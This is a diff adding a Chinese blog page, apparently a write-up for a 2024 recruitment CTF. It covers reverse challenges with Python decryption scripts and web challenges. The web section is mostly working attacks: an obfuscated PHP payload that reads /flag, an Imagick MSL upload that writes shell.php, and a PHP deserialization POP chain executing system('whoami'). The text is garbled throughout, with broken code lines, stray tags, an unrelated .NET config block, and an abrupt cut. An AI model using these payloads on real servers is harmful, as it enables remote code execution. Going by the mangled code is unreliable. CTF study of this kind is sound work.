@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>山石CTF 2024 招新赛/REVERSE&amp;WEB 篇 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="C++ 保留符号无脱 → 看 main 还原 循环右移 + 位交换 加密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="山石CTF 2024 招新赛&#x2F;REVERSE&amp;WEB 篇">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Reverse/2024%E5%B9%B4%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E6%8B%9B%E6%96%B0%E8%B5%9BWP_REVERSE-WEB%E7%AF%87/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="C++ 保留符号无脱 → 看 main 还原 循环右移 + 位交换 加密">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="C++ 字符变换">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Reverse/2024%E5%B9%B4%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E6%8B%9B%E6%96%B0%E8%B5%9BWP_REVERSE-WEB%E7%AF%87/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '山石CTF 2024 招新赛/REVERSE&WEB 篇',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">山石CTF 2024 招新赛/REVERSE&amp;WEB 篇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/">Reverse</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="山石CTF 2024 招新赛/REVERSE&amp;WEB 篇"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/199581.html">https://www.ctfiot.com/199581.html</a><br>ID: 199581</p>
+</blockquote>
+<p>REVERSE</p>
+<p>easycpp2</p>
+<p>flag: ayyctf{you_get_rand_num}</p>
+<p>该程序没有去除符号, 保留了调试符号, 所以直接定位到了main函数:</p>
+<p>逻辑不复杂:</p>
+<p>__int64 __fastcall main(int argc, const char **argv)<br>{<br>  std::<br>ostream *v2; &#x2F;&#x2F; rax<br>  std::<br>string::<br>iterator __for_end; &#x2F;&#x2F; [rsp+20h] [rbp-80h] BYREF<br>  std::<br>string::<br>iterator _<em>for_begin; &#x2F;&#x2F; [rsp+28h] [rbp-78h] BYREF<br>  uint8_t data[24]; &#x2F;&#x2F; [rsp+30h] [rbp-70h]<br>  std::<br>string usr_input; &#x2F;&#x2F; [rsp+50h] [rbp-50h] BYREF<br>  uint8_t enc</em>; &#x2F;&#x2F; [rsp+7Fh] [rbp-21h]<br>  char *c; &#x2F;&#x2F; [rsp+80h] [rbp-20h]<br>  std::<br>string *__for_range; &#x2F;&#x2F; [rsp+88h] [rbp-18h]<br>  int rotate_count; &#x2F;&#x2F; [rsp+94h] [rbp-Ch]<br>  int i; &#x2F;&#x2F; [rsp+98h] [rbp-8h]<br>  int correct_num; &#x2F;&#x2F; [rsp+9Ch] [rbp-4h]</p>
+<p>  _main();<br>  correct_num &#x3D; 0;<br>  std::<br>string::<br>basic_string(&amp;usr_input);<br>  std::<br>operator&gt;&gt;<char>(refptr__ZSt3cin);<br>  *(_QWORD *)data &#x3D; 0xB3B78DA987B3B383ui64;<br>  *(_QWORD *)&amp;data[8] &#x3D; 0xA5BEA98B8FBEAB9Fui64;<br>  *(_QWORD *)&amp;data[16] &#x3D; 0xBB9BAB9DBE899D83ui64;<br>  rotate_count &#x3D; rand() % 7 + 1;<br>  i &#x3D; 0;<br>  __for_range &#x3D; &amp;usr_input;<br>  __for_begin._M_current &#x3D; (char *)std::<br>string::<br>begin(&amp;usr_input);<br>  __for_end._M_current &#x3D; (char <em>)std::<br>string::<br>end(__for_range);<br>  while ( __gnu_cxx::<br>operator!&#x3D;&lt;char *,std::<br>string&gt;(&amp;__for_begin, &amp;__for_end) )<br>  {<br>    c &#x3D; __gnu_cxx::<br>__normal_iterator&lt;char *,std::<br>string&gt;::<br>operator</em>(&amp;<em><em>for_begin);<br>    enc</em> &#x3D; func1(*c, rotate_count);<br>    if ( enc</em> &#x3D;&#x3D; data[i] )<br>      ++correct_num;<br>    ++i;<br>    __gnu_cxx::<br>__normal_iterator&lt;char *,std::<br>string&gt;::<br>operator++(&amp;_<em>for_begin);<br>  }<br>  if ( correct_num &#x3D;&#x3D; 24 )<br>    v2 &#x3D; (std::<br>ostream *)std::<br>operator&lt;&lt;&lt;std::<br>char_traits<char>&gt;(refptr__ZSt4cout, “Correct!”);<br>  else<br>    v2 &#x3D; (std::<br>ostream *)std::<br>operator&lt;&lt;&lt;std::<br>char_traits<char>&gt;(refptr__ZSt4cout, “No!”);<br>  refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6</em>(v2);<br>  std::<br>string::~string(&amp;usr_input);<br>  return 0i64;<br>}</p>
+<p>1.首先读入用户输入:</p>
+<p>std::<br>string::<br>basic_string(&amp;usr_input);<br>std::<br>operator&gt;&gt;<char>(refptr__ZSt3cin);</p>
+<p>2.然后获取一个rotate_count:</p>
+<p>rotate_count &#x3D; rand() % 7 + 1;</p>
+<p>3.然后遍历用户输入:</p>
+<p>i &#x3D; 0;<br>__for_range &#x3D; &amp;usr_input;<br>__for_begin._M_current &#x3D; (char *)std::<br>string::<br>begin(&amp;usr_input);<br>__for_end._M_current &#x3D; (char <em>)std::<br>string::<br>end(__for_range);<br>while ( __gnu_cxx::<br>operator!&#x3D;&lt;char *,std::<br>string&gt;(&amp;__for_begin, &amp;__for_end) )<br>{<br>  c &#x3D; __gnu_cxx::<br>__normal_iterator&lt;char *,std::<br>string&gt;::<br>operator</em>(&amp;<em><em>for_begin);<br>  enc</em> &#x3D; func1(*c, rotate_count);<br>  if ( enc</em> &#x3D;&#x3D; data[i] )<br>    ++correct_num;<br>  ++i;<br>  __gnu_cxx::<br>__normal_iterator&lt;char *,std::<br>string&gt;::<br>operator++(&amp;__for_begin);<br>}</p>
+<p>4.查看func1函数:</p>
+<p>uint8_t __cdecl func1(uint8_t value, uint8_t n)<br>{<br>  uint8_t enc_step_one; &#x2F;&#x2F; [rsp+2Fh] [rbp-1h]</p>
+<p>  if ( !n || n &gt; 8u )<br>    return value;<br>  enc_step_one &#x3D; func1_1(value, n);<br>  return func1_2(enc_step_one, n);<br>}</p>
+<p>uint8_t __cdecl func1_1(uint8_t value, uint8_t shift)<br>{<br>  return ((int)value &gt;&gt; shift) | (value &lt;&lt; (8 - shift));<br>}</p>
+<p>uint8_t __cdecl func1_2(uint8_t byte, int n)<br>{<br>  uint8_t bytea; &#x2F;&#x2F; [rsp+20h] [rbp+10h]</p>
+<p>  bytea &#x3D; byte;<br>  if ( ((byte &amp; 1) !&#x3D; 0) !&#x3D; ((((int)byte &gt;&gt; (n - 1)) &amp; 1) !&#x3D; 0) )<br>    return (1 &lt;&lt; (n - 1)) ^ byte ^ 1;<br>  return bytea;<br>}</p>
+<p>5.解密: 所以逻辑就是将输入的每一个字符进行循环右移rotate_count次然后把第rotate_count位与第1位交换, 然后与data进行比较, 解密则是先交换回去循环左移rotate_count即可:</p>
+<p>def circular_left_shift(byte, shift):<br>    shifted_byte &#x3D; ((byte &lt;&lt; shift) &amp; 0xFF) | (byte &gt;&gt; (8 - shift))<br>    return shifted_byte</p>
+<p>def swap_bits(byte, n):  <br>    n_index &#x3D; n - 1 # 将n转换为0到7范围内的索引<br>  <br>    # 获取第1位和第n位的值<br>    bit1 &#x3D; byte &amp; 1               # 第1位<br>    bitN &#x3D; (byte &gt;&gt; n_index) &amp; 1  # 第n位<br>  <br>    # 如果两位不同，交换它们<br>    if bit1 !&#x3D; bitN:<br>        # 翻转第1位<br>        byte ^&#x3D; 1<br>        # 翻转第n位<br>        byte ^&#x3D; (1 &lt;&lt; n_index)<br>  <br>    return byte</p>
+<p>flag &#x3D; “”<br>data &#x3D; [ 0x83, 0xb3, 0xb3, 0x87, 0xa9, 0x8d, 0xb7, 0xb3, 0x9f, 0xab, 0xbe, 0x8f, 0x8b, 0xa9, 0xbe, 0xa5, 0x83, 0x9d, 0x89, 0xbe, 0x9d, 0xab, 0x9b, 0xbb ]<br>for n in data:<br>  swap_data &#x3D; swap_bits(n, 7)<br>  shift_data &#x3D; circular_left_shift(swap_data, 7)<br>  flag +&#x3D; chr(shift_data)<br>print(flag)<br># ayyctf{you_get_rand_num}</p>
+<p>File size Ratio Format Name</p>
+<hr>
+<p>upx: ..&#x2F;finalpack: CantUnpackException: l_info corrupted</p>
+<p>Unpacked 1 file: 0 ok, 1 error.</p>
+<p>或者直接手脱, 网上关于这类文章很多, 例如这篇(<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6881?time__1311=n4+xnD0DRDyBeAK4GNnm00GODgBorD97YD">https://xz.aliyun.com/t/6881?time__1311=n4%2BxnD0DRDyBeAK4GNnm00GODgBorD97YD</a>), 就直接F8一路步过, 找到关键点, 直接dump即可。</p>
+<p>UPX脱壳如上所示</p>
+<p>LEA RDI &#x3D;&gt;local_68 ,[RBP + -0x60 ]<br>CALL thunk_FUN_00421290</p>
+<p>thunk_FUN_00421290(rdi), 就是字符串, 所以这个函数肯定是strlen 然后用户输入是local_44, 将local_44进了FUN_401830变化后与 “02CD290D5ACE1A83″进行比较, FUN_401830的逻辑:</p>
+<p>是将字符串循环右移 那关键在于移动了几轮, 也就是FUN_00401830(local_68, local_44);其中的local_44是多少, 动调即可发现是0xB，写python脚本即可:</p>
+<p>def left_rotate_string(s, n):<br>    return s[n:] + s[:n]</p>
+<p>s &#x3D; “02CD290D5ACE1A83”<br>n &#x3D; 0xB<br>print(left_rotate_string(s, n)) #E1A8302CD290D5AC</p>
+<?xml version="1.0" encoding="utf-8" ?>
+<configuration>
+    <startup> 
+        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
+    </startup>
+</configuration>
+
+<p>运行看看, 有个SaveAs按钮:</p>
+<p>使用dnSpyEx反编译:</p>
+<p>① 将当前字节-1</p>
+<p>② 224是11100000, 31是00011111, 所以b&#x3D;(byte)(((b&amp;224) &gt;&gt; 5)|((b&amp;31)&lt;&lt;3));就是交换其三位和后五位的位置</p>
+<p>③ 然后取反。</p>
+<p>def decrypt_image_bytes(encrypted_bytes):<br>    decrypted_bytes &#x3D; bytearray(len(encrypted_bytes))<br>  <br>    for i, b in enumerate(encrypted_bytes):<br>        b &#x3D; ~b &amp; 0xFF # 取反<br>        b &#x3D; ((b &amp; 0xF8) &gt;&gt; 3) | ((b &amp; 0x7) &lt;&lt; 5) # 恢复高低位的顺序<br>        b &#x3D; (b + 1) &amp; 0xFF # 加 1<br>    <br>        decrypted_bytes[i] &#x3D; b<br>  <br>    return bytes(decrypted_bytes)</p>
+<p>with open(‘enc.png’, ‘rb’) as f:<br>    encrypted_data &#x3D; f.read()</p>
+<p>decrypted_data &#x3D; decrypt_image_bytes(encrypted_data)<br>with open(‘dec.png’, ‘wb’) as f:<br>    f.write(decrypted_data)</p>
+<p>for (int i &#x3D; 1; i &lt; a2; i++) {<br>        a1[i - 1] ^&#x3D; a1[i];<br>}</p>
+<p>def decrypt(cipher):<br>    length &#x3D; len(cipher)<br>    for i in range(length - 1, 0, -1):<br>        cipher[i - 1] ^&#x3D; cipher[i]<br>    return bytes(cipher).decode(‘utf-8’)</p>
+<p>cipher &#x3D; [0x18, 0x00, 0x1a, 0x17, 0x12, 0x1d, 0x1a, 0x05, 0x0a, 0x56, 0x09, 0x03, 0x5c, 0x0f, 0x12, 0x17, 0x5d, 0x09, 0x02, 0x03, 0x5b, 0x0b, 0x05, 0x5d, 0x08, 0x50, 0x05, 0x5d, 0x08, 0x03, 0x53, 0x13, 0x0f, 0x7d]<br>plain_text &#x3D; decrypt(cipher)<br>print(plain_text)<br># ayyctf{adn812nasd9021jad91ad912ar}</p>
+<p>web</p>
+<p>babycode</p>
+<p>POST &#x2F; HTTP&#x2F;1.1<br>Host: xxx.xxx.xxx.xxx:80<br>Cache-Control: max-age&#x3D;0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;126.0.0.0 Safari&#x2F;537.36<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 636</p>
+<p>cmd&#x3D;%24%5f%5f%29%3b%24%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2d%2d%24%5f%5f%3b%24%5f%5f%5f%5f%5f%3d%28%28%5f%2f%5f%29%2e%27%27%29%7b%24%5f%5f%7d%3b%24%5f%5f%5f%5f%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%24%5f%5f%5f%5f%5f%2e%24%5f%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%2e%24%5f%5f%5f%5f%3b%24%7b%24%5f%5f%5f%5f%7d%7b%5f%7d%28%24%7b%24%5f%5f%5f%5f%7d%7b%5f%5f%7d%29%3b%2f%2f&amp;_&#x3D;highlight_file&amp;__&#x3D;&#x2F;flag</p>
+<p>POST &#x2F;?class&#x3D;Imagick&amp;arg&#x3D;vid:<br>msl:&#x2F;tmp&#x2F;php* HTTP&#x2F;1.1<br>Host: localhost:<br>8080<br>Accept-Encoding: gzip, deflate, br<br>Accept: <em>&#x2F;</em><br>Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;116.0.5845.141 Safari&#x2F;537.36<br>Connection: close Cache-Control: max-age&#x3D;0<br>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryTrWYaXKoVR1wiLhP<br>Content-Length: 332</p>
+<p>——WebKitFormBoundaryTrWYaXKoVR1wiLhP Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”vulhub.msl”<br>Content-Type: text&#x2F;plain<br><?xml version="1.0" encoding="UTF-8"?>  <read filename="caption:&lt;?=phpinfo();?&gt;"/> <write filename="info:
+shell.php" /><br>——WebKitFormBoundaryTrWYaXKoVR1wiLhP–</p>
+<p>Net::<br>__destruct()-&gt;Stone::<br>__toString()-&gt;Works::<br>__call()-&gt;Works::<br>keep()-&gt;Net::<br>__get()-&gt;Hill::<br>__invoke()</p>
+<?php
+//highlight_file(__FILE__);
+//error_reporting(0);
+class Hill{
+
+    private $cmd;
+    private $content;
+
+    public function __construct($cmd, $content)
+    {
+        $this->cmd = $cmd;
+        $this->content = $content;
+    }
+    public function __invoke()
+    {
+        call_user_func($this->cmd, $this->content);
+    }
+}
+
+class Stone
+{
+    public $ctf;
+    public $game = "good game!";
+    // public function __construct($ctf)
+    // {
+    //     $this->ctf = $ctf;
+    // }
+    public function __toString()
+    {
+        return $this->ctf->keep();
+    }
+    public function keep()
+    {
+        return $this->ctf . " is " . $this->game;
+    }
+}
+
+class Net
+{
+    private $value;
+    private $welcome = "Weclome!";
+    public $banner = "keep go";
+    public $key;
+    // public function __construct($key, $value)
+    // {
+    //     $this->key = $name;
+    //     $this->value = $password;
+    // }
+
+    public function __set($Attribute, $value){
+        $this->$Attribute = $value;
+    }
+
+    public function __get($name)
+    {
+        $value = $this->key;
+        $value();
+    }
+    public function __destruct()
+    {
+        if ($this->welcome == "go go go!") {
+            echo $this->banner;
+        } else {
+            echo "stop";
+        }
+    }
+    public function hello(){
+        echo $welcome;
+    }
+}
+class Works
+{
+    protected $code;
+
+    //exp
+    public function __construct(){
+        $this->code = new Net();
+        $this->code->key = new Hill("system","whoami");
+    }
+
+    public function __call($name, $arguments)
+    {
+        $num = $name;
+        $this->$num();
+    }
+    private function keep()
+    {
+        return $this->code->secret;
+    }
+}
+// if (isset($_POST['pop'])) {
+//     $a = unserialize($_POST['pop']);
+//     $a->hello("welcome");
+// } else {
+//     die("POST and start");
+// } 
+
+$a = new Net();
+$a->welcome = "go go go!";
+$a->banner = new Stone();
+$a->banner->ctf = new Works();
+
+$exp = urlencode(serialize($a));
+print_r(str_replace("+","%20",$exp));
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 